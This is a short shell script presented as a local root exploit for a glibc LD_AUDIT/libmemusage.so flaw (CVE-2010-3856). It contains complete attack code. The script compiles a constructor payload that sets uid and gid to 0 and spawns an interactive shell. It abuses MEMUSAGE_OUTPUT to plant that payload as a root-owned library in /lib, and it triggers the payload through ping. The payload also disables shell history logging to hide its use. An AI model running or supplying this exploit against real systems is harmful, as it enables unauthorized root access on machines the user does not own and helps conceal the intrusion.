#!/bin/sh
#
# [+] Glibc <= 2.12.x, 2.11.3, 2.12.2 LD_AUDIT libmemusage.so local root exploit
#
# Edited by Todor Donev (todor dot donev at gmail dot com)
# This is another exploit for CVE-2010-3856
#
# Thanks to Tavis 'taviso' Ormandy, zx2c4, Marco 'raptor' Ivaldi, Stiliyan Angelov
# and Tsvetelina Emirska
#
# Another exploits:
# http://www.0xdeadbeef.info/exploits/raptor_ldaudit
# http://www.0xdeadbeef.info/exploits/raptor_ldaudit2
# http://www.exploit-db.com/exploits/18105/
# http://seclists.org/fulldisclosure/2010/Oct/257
# http://seclists.org/bugtraq/2010/Oct/200
#
echo "[+] Setting umask to 0 so we have world writable files."
umask 0
echo "[+] Preparing binary payload.."
cat > /tmp/payload.c <<_EOF
void __attribute__((constructor)) init()
{
    unlink("/lib/sploit.so");
    setuid(0);
    setgid(0);
    setenv("HISTFILE", "/dev/null", 1);
    execl("/bin/sh", "/bin/sh", "-i", 0);
}
_EOF
gcc -w -fPIC -shared -o /tmp/exploit /tmp/payload.c
echo "[+] Writing root owned world readable file in /lib"
LD_AUDIT="libmemusage.so" MEMUSAGE_OUTPUT="/lib/sploit.so" ping 2>/dev/null
echo "[+] Filling the lib file with lib contents."
cat /tmp/exploit > /lib/sploit.so
rm /tmp/payload.c /tmp/exploit
echo "[+] Executing payload.."
LD_AUDIT="sploit.so" ping
